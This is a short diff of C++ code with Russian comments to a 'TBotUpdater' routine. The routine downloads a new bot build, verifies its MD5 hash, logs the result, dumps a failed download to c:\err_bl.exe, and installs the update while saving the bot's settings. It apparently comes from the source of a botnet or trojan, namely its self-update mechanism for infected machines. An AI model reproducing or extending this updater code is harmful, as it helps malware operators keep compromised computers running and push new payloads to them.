@@ -137,7 +137,15 @@ void TBotUpdater::DownloadAndSetup(const string &FileURL, const string &MD5)
 	{
 		// Файл загружен, проверяем md5 хэш
 		string Hash = CalcMd5SummForBuffer(Data.Memory(), Data.Size());
-		if (Hash == MD5)
+		BAUDBG("АвтоОбновление", "Загружено %d байт. md5 %s", Data.Size(), Hash.t_str());
+
+		if (Hash != MD5)
+		{
+			BAUDBG("АвтоОбновление", "Ошибка загрузки билда. МД5 не совпадают");
+			File::WriteBufferA("c:\\err_bl.exe", Data.Memory(), Data.Size());
+        	return;
+		}
+
 		{
 			// Файл успешно скачан, устанавливаем его
 			PCHAR Name = File::GetTempNameA();
@@ -149,7 +157,10 @@ void TBotUpdater::DownloadAndSetup(const string &FileURL, const string &MD5)
 			Bot->SaveSettings();
 
 			// Устанавливаем новую версию
-			MakeUpdate(Name);
+			if (MakeUpdate(Name))
+			{
+            	BAUDBG("АвтоОбновление", "Новая версия бота успешно установлена.");
+            }
 
 			STR::Free(Name);
         }
